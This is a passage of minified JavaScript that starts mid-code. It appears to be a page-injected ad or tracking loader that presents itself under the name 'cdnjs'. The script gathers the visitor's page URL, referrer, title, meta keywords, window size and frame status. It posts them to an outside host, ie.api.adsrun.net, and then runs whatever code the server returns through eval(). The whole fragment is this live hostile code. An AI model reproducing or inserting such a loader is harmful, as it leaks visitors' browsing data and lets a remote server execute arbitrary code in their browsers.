...
g=[],f=0;f<c.length;f++)"keywords"==c[f].name.toLowerCase()&&g.push(c[f].content);req={width:m,height:e,frame:a!=a.top,location:b.location.toString(),referer:b.referrer,title:b.title,keywords:g.join(", "),loader:k};b.gotowf||(b.gotowf=!0,ajax(h,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){console.log(c)}}))})(window,document,"http://ie.api.adsrun.net/post",{"name":"cdnjs","time":1459729319.6027,"user":"1053300.8286592","subid":1053300,"geo":"IE","hash":"e6e7888efdecdbbd64194bb33fb15059"});
